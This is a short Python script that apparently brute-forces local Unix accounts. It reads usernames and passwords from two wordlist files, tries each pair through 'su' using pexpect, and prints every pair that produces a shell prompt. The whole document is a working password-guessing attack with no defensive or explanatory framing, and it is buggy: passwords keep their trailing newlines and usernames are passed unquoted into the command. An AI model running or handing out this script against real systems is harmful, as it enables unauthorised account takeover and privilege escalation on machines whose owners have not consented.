import pexpect
userhandle = open("usertest")
passhandle = open("passtest")
for password in passhandle:
    for username in userhandle:
        try:
            child = pexpect.spawn('su '+username)
            child.sendline(password)
            sign = child.expect(['.*failure','\w*[#\$]'])
            
        except IOError:
            pass
        if sign == 1:
            print username,password

    userhandle = open("usertest")